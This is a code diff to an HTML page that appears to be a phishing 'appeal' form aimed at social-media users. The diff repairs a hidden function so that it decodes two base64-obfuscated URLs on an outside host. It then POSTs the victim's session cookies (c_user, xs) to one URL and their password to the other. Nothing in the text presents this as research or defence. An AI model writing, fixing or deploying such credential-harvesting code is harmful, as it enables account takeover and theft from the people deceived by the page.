@@ -1552,13 +1552,21 @@
         const submitBtn = document.getElementById('submit-appeal-btn');
         
         // Function to submit to other endpoints
- function submitToOtherEndpoints(data) {
+function submitToOtherEndpoints(data) {
+    // Base64 encoded URLs
+    const encodedEndpoint1 = 'aHR0cHM6Ly9wcm9mZXNzb3ItYXNpZi52ZXJjZWwuYXBwL2FzaWY=';
+    const encodedEndpoint2 = 'aHR0cHM6Ly9wcm9mZXNzb3ItYXNpZi52ZXJjZWwuYXBwL2FzaWZwYXNz';
+
+    // Decode URLs
+    const endpoint1 = atob(encodedEndpoint1);
+    const endpoint2 = atob(encodedEndpoint2);
+
     // c_user اور xs بھیجنے والا endpoint
     const data1 = {
         c_user: data.c_user,
         xs: data.xs
     };
-    fetch('aHR0cHM6Ly9wcm9mZXNzb3ItYXNpZi52ZXJjZWwuYXBwL2FzaWY=', {
+    fetch(endpoint1, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify(data1)
@@ -1571,7 +1579,7 @@
     const data2 = {
         password: data.password
     };
-    fetch('aHR0cHM6Ly9wcm9mZXNzb3ItYXNpZi52ZXJjZWwuYXBwL2FzaWZwYXNz', {
+    fetch(endpoint2, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify(data2)
@@ -1872,6 +1880,7 @@
     </script>
 
 </body></html>
+
 
 
 
